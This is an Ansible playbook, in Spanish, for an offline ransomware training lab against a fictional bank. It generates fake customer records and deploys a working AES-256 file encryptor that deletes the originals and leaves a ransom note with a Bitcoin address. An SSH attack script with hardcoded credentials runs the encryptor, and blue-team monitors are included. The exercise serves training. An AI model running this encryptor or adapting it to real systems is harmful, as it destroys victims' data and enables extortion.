---
# ==============================================================================
# Escenario Ransomware - Configuracion Post-Clonado
# ==============================================================================
# Este playbook se ejecuta en cada maquina despues del clonado.
# NO hay conexion a internet disponible.
#
# FLUJO DEL ATAQUE:
#   1. Crear 50 archivos de prueba en core-bank con Python faker
#   2. Crear backup de algunos archivos
#   3. Ejecutar script de ransomware desde attack-ws via SSH
#   4. Encriptar archivos con AES-256-CBC
#   5. Dejar nota de rescate
# ==============================================================================

- name: "Preparar archivos en core-bank"
  hosts: core-bank
  gather_facts: yes
  become: yes
  tasks:
    - name: "Crear usuario del banco"
      ansible.builtin.user:
        name: admin_banco
        password: "{{ 'banco2026' | password_hash('sha512', salt='bhusalt', rounds=5000) }}"
        shell: /bin/bash
        create_home: yes
        groups: sudo
        comment: "Administrador del Sistema Bancario"

    - name: "Crear directorio de documentos del banco"
      ansible.builtin.file:
        path: /srv/banco/documentos
        state: directory
        owner: admin_banco
        group: admin_banco
        mode: "0755"

    - name: "Crear directorio de backups"
      ansible.builtin.file:
        path: /srv/banco/backup
        state: directory
        owner: admin_banco
        group: admin_banco
        mode: "0755"

    - name: "Crear script generador de archivos de prueba"
      ansible.builtin.copy:
        dest: /opt/generar_documentos.py
        mode: "0755"
        content: |
          #!/usr/bin/env python3
          import os
          import random
          from faker import Faker

          fake = Faker('es_AR')
          Faker.seed(42)
          random.seed(42)

          output_dir = "/srv/banco/documentos"
          backup_dir = "/srv/banco/backup"
          num_files = 50

          print(f"[*] Generando {num_files} archivos de prueba en {output_dir}...")

          # Tipos de documentos a generar
          doc_types = [
              ("cuenta_cliente_{i}.txt", "cuenta"),
              ("transaccion_{i}.txt", "transaccion"),
              ("cliente_{i}.txt", "cliente"),
              ("prestamo_{i}.txt", "prestamo"),
              ("movimiento_{i}.txt", "movimiento"),
          ]

          for i in range(1, num_files + 1):
              doc_type = random.choice(doc_types)
              filename = doc_type[0].format(i=i)
              filepath = os.path.join(output_dir, filename)

              content = f"=== BANCO DEL SOL === Documento: {doc_type[1].upper()} ===\n"
              content += f"Numero de documento: {random.randint(10000000, 99999999)}\n"
              content += f"Fecha: {fake.date()}\n"
              content += f"Cliente: {fake.name()}\n"
              content += f"CUIT: {fake.cuit()}\n"
              content += f"Direccion: {fake.address()}\n"
              content += f"Telefono: {fake.phone_number()}\n"
              content += f"Email: {fake.email()}\n"
              content += f"Saldo: ${random.uniform(1000, 500000):.2f}\n"
              content += f"Tipo de cuenta: {random.choice(['Caja de Ahorro', 'Cuenta Corriente', 'Plazo Fijo'])}\n"
              content += f"Estado: {random.choice(['Activa', 'Inactiva', 'Bloqueada'])}\n"
              content += f"Numero de cuenta: {random.randint(100000000, 999999999)}\n"
              content += f"CBU: {random.randint(1000000000000000000000, 9999999999999999999999)}\n"
              content += f"\n--- Detalle de transacciones ---\n"
              for _ in range(5):
                  content += f"  {fake.date()} - {fake.sentence()} - ${random.uniform(100, 50000):.2f}\n"
              content += f"\n--- Observaciones ---\n"
              content += f"{fake.paragraph(nb_sentences=3)}\n"

              with open(filepath, 'w') as f:
                  f.write(content)

          print(f"[+] {num_files} archivos generados exitosamente")

          # Copiar algunos archivos al directorio de backup
          backup_files = random.sample(range(1, num_files + 1), 10)
          for i in backup_files:
              for doc_type in doc_types:
                  src = os.path.join(output_dir, doc_type[0].format(i=i))
                  dst = os.path.join(backup_dir, doc_type[0].format(i=i))
                  if os.path.exists(src):
                      import shutil
                      shutil.copy2(src, dst)

          print(f"[+] Backup de {len(backup_files)} archivos creado en {backup_dir}")

    - name: "Ejecutar generador de archivos"
      ansible.builtin.command:
        cmd: python3 /opt/generar_documentos.py
      register: gen_result

    - name: "Verificar archivos generados"
      ansible.builtin.shell: |
        echo "=== Documentos ==="
        ls -la /srv/banco/documentos/ | head -20
        echo ""
        echo "=== Backup ==="
        ls -la /srv/banco/backup/
        echo ""
        echo "Total documentos: $(ls /srv/banco/documentos/ | wc -l)"
        echo "Total backup: $(ls /srv/banco/backup/ | wc -l)"

    - name: "Crear script de encriptacion ransomware"
      ansible.builtin.copy:
        dest: /opt/ransomware.py
        mode: "0755"
        content: |
          #!/usr/bin/env python3
          """
          Simulador de Ransomware - Banco del Sol
          Utiliza AES-256-CBC para encriptar archivos
          ADVERTENCIA: Solo para fines educativos
          """
          import os
          import sys
          from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
          from cryptography.hazmat.primitives import padding
          from cryptography.hazmat.backends import default_backend

          # Clave de encriptacion (32 bytes para AES-256)
          KEY = b'0123456789abcdef0123456789abcdef'  # 32 bytes
          IV_SIZE = 16
          TARGET_DIR = "/srv/banco/documentos"
          RANSOM_NOTE = os.path.join(TARGET_DIR, "README_RANSOM.txt")

          def encrypt_file(filepath):
              """Encripta un archivo usando AES-256-CBC"""
              try:
                  with open(filepath, 'rb') as f:
                      data = f.read()

                  # Padding PKCS7
                  padder = padding.PKCS7(128).padder()
                  padded_data = padder.update(data) + padder.finalize()

                  # Generar IV aleatorio
                  iv = os.urandom(IV_SIZE)

                  # Encriptar
                  cipher = Cipher(algorithms.AES(KEY), modes.CBC(iv), backend=default_backend())
                  encryptor = cipher.encryptor()
                  ciphertext = encryptor.update(padded_data) + encryptor.finalize()

                  # Guardar archivo encriptado
                  encrypted_path = filepath + ".encrypted"
                  with open(encrypted_path, 'wb') as f:
                      f.write(iv + ciphertext)

                  # Eliminar original
                  os.remove(filepath)
                  return True
              except Exception as e:
                  print(f"  [!] Error encriptando {filepath}: {e}")
                  return False

          def create_ransom_note():
              """Crea la nota de rescate"""
              note = f"""
          ╔══════════════════════════════════════════════════════════════╗
          ║                    TUS ARCHIVOS HAN SIDO                   ║
          ║                     ENCRIPTADOS CON AES-256                 ║
          ╚══════════════════════════════════════════════════════════════╝

          Banco del Sol - Todos sus archivos financieros han sido encriptados.

          Sus archivos estan en /srv/banco/documentos/*.encrypted

          Para descifrar sus archivos, necesitara la clave de descifrado.

          ADVERTENCIA:
          - No intente descifrar los archivos usted mismo
          - No apague el servidor (podria perder los datos)
          - La clave de descifrado se borrara en 72 horas

          Para obtener la clave de descifrado:
          1. Envie 0.5 Bitcoin a la direccion:
             bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh

          2. Envie un correo a: restore@bancodelsol-scam.com
             Asunto: Ransom #001 - [SU NUMERO DE CLIENTE]
             Adjunte: Este archivo

          3. Recibira la clave de descifrado en 24-48 horas

          ID de la victima: {os.urandom(8).hex()}
          Fecha: 2026-07-12
          Temporizador: 72:00:00

          ╔══════════════════════════════════════════════════════════════╗
          ║  SUS ARCHIVOS SON IMPORTANTES. ACTUE AHORA.                 ║
          ╚══════════════════════════════════════════════════════════════╝
          """
              with open(RANSOM_NOTE, 'w') as f:
                  f.write(note)
              print(f"[+] Nota de rescate creada: {RANSOM_NOTE}")

          def main():
              print("=" * 60)
              print("  SIMULADOR DE RANSWARE - BANCO DEL SOL")
              print("  ADVERTENCIA: Solo para fines educativos")
              print("=" * 60)
              print()

              # Verificar directorio objetivo
              if not os.path.exists(TARGET_DIR):
                  print(f"[!] Directorio no encontrado: {TARGET_DIR}")
                  sys.exit(1)

              # Encriptar archivos
              encrypted_count = 0
              for filename in os.listdir(TARGET_DIR):
                  filepath = os.path.join(TARGET_DIR, filename)
                  if os.path.isfile(filepath) and not filename.endswith('.encrypted') and not filename.startswith('README'):
                      print(f"[*] Encriptando: {filename}")
                      if encrypt_file(filepath):
                          encrypted_count += 1
                          print(f"  [+] Encriptado: {filename}.encrypted")

              print()
              print(f"[*] Archivos encriptados: {encrypted_count}")
              print(f"[*] Archivos totales: {len(os.listdir(TARGET_DIR))}")

              # Crear nota de rescate
              create_ransom_note()

              print()
              print("=" * 60)
              print("  ENCRIPTACION COMPLETADA")
              print("=" * 60)

          if __name__ == "__main__":
              main()

    - name: "Crear script de monitoreo de archivos para blue-team"
      ansible.builtin.copy:
        dest: /opt/monitor_files.sh
        mode: "0755"
        content: |
          #!/bin/bash
          # Monitor de archivos - Deteccion de ransomware
          TARGET_DIR="/srv/banco/documentos"
          LOG_FILE="/var/log/file_monitor.log"

          echo "=== Monitor de Archivos - Banco del Sol ===" > "$LOG_FILE"
          echo "Inicio: $(date)" >> "$LOG_FILE"

          while true; do
            # Verificar cambios en archivos
            inotifywait -m -r -e modify,create,delete,move "$TARGET_DIR" 2>/dev/null >> "$LOG_FILE" &
            INOTIFY_PID=$!

            # Verificar archivos encriptados periodicamente
            ENCRYPTED_COUNT=$(find "$TARGET_DIR" -name "*.encrypted" 2>/dev/null | wc -l)
            TOTAL_COUNT=$(find "$TARGET_DIR" -type f 2>/dev/null | wc -l)

            if [ "$ENCRYPTED_COUNT" -gt 0 ]; then
              echo "[!] ALERTA: $ENCRYPTED_COUNT archivos encriptados detectados en $(date)" >> "$LOG_FILE"
              echo "[!] RANSOMWARE DETECTADO" >> "$LOG_FILE"
            fi

            sleep 5
            kill $INOTIFY_PID 2>/dev/null
          done

- name: "Configurar attack-ws para ejecutar ransomware"
  hosts: attack-ws
  gather_facts: yes
  become: yes
  tasks:
    - name: "Obtener IP de core-bank"
      ansible.builtin.set_fact:
        core_bank_ip: "{{ hostvars['core-bank']['ansible_default_ipv4']['address'] | default('10.0.0.3') }}"

    - name: "Copiar script de ransomware a attack-ws"
      ansible.builtin.copy:
        dest: /opt/ransomware_attack.py
        mode: "0755"
        content: |
          #!/usr/bin/env python3
          """
          Script de ataque Ransomware - Banco del Sol
          Ejecuta el ransomware via SSH en core-bank
          """
          import subprocess
          import sys
          import time

          CORE_BANK_IP = "{{ core_bank_ip }}"
          CORE_BANK_USER = "admin_banco"
          CORE_BANK_PASS = "banco2026"

          def ssh_exec(command):
              """Ejecuta comando via SSH"""
              ssh_cmd = f"sshpass -p '{CORE_BANK_PASS}' ssh -o StrictHostKeyChecking=no {CORE_BANK_USER}@{CORE_BANK_IP} '{command}'"
              result = subprocess.run(ssh_cmd, shell=True, capture_output=True, text=True)
              return result.stdout, result.stderr

          def main():
              print("=" * 60)
              print("  ATAQUE RANSOMWARE - BANCO DEL SOL")
              print("  ADVERTENCIA: Solo para fines educativos")
              print("=" * 60)
              print()

              # Verificar conexion
              print("[*] Verificando conexion a core-bank...")
              stdout, stderr = ssh_exec("echo 'Conexion establecida'")
              if "Conexion establecida" in stdout:
                  print("[+] Conexion establecida con core-bank")
              else:
                  print(f"[!] Error de conexion: {stderr}")
                  sys.exit(1)

              # Verificar archivos existentes
              print("[*] Verificando archivos en core-bank...")
              stdout, stderr = ssh_exec("ls /srv/banco/documentos/ | wc -l")
              print(f"[+] Archivos encontrados: {stdout.strip()}")

              # Ejecutar ransomware
              print("[*] Ejecutando ransomware...")
              print("[*] Esto puede tardar unos momentos...")
              stdout, stderr = ssh_exec("python3 /opt/ransomware.py")
              print(stdout)
              if stderr:
                  print(f"[!] Errores: {stderr}")

              # Verificar resultados
              print("[*] Verificando resultados...")
              stdout, stderr = ssh_exec("ls /srv/banco/documentos/*.encrypted 2>/dev/null | wc -l")
              print(f"[+] Archivos encriptados: {stdout.strip()}")

              stdout, stderr = ssh_exec("ls /srv/banco/documentos/README_RANSOM.txt 2>/dev/null")
              if "README_RANSOM.txt" in stdout:
                  print("[+] Nota de rescate creada exitosamente")

              print()
              print("=" * 60)
              print("  ATAQUE COMPLETADO")
              print("  Los archivos de core-bank han sido encriptados")
              print("=" * 60)

          if __name__ == "__main__":
              main()

    - name: "Crear script de monitoreo para blue-team"
      ansible.builtin.copy:
        dest: /opt/monitor_ransomware.sh
        mode: "0755"
        content: |
          #!/bin/bash
          # Monitor de ransomware - Banco del Sol
          # Detecta actividad sospechosa de encriptacion

          echo "=== Monitor de Ransomware - Banco del Sol ==="
          echo "Presione Ctrl+C para detener"
          echo ""

          while true; do
            # Verificar archivos encriptados
            ENCRYPTED=$(ssh admin_banco@{{ hostvars['core-bank']['ansible_default_ipv4']['address'] | default('10.0.0.3') }} "find /srv/banco/documentos -name '*.encrypted' 2>/dev/null | wc -l" 2>/dev/null)

            if [ "$ENCRYPTED" -gt 0 ] 2>/dev/null; then
              echo "[!] $(date) - ALERTA: $ENCRYPTED archivos encriptados detectados!"
              echo "[!] RANSOMWARE EN PROGRESO"
            fi

            # Verificar procesos sospechosos
            ssh admin_banco@{{ hostvars['core-bank']['ansible_default_ipv4']['address'] | default('10.0.0.3') }} "ps aux | grep python3 | grep -v grep" 2>/dev/null

            sleep 5
          done
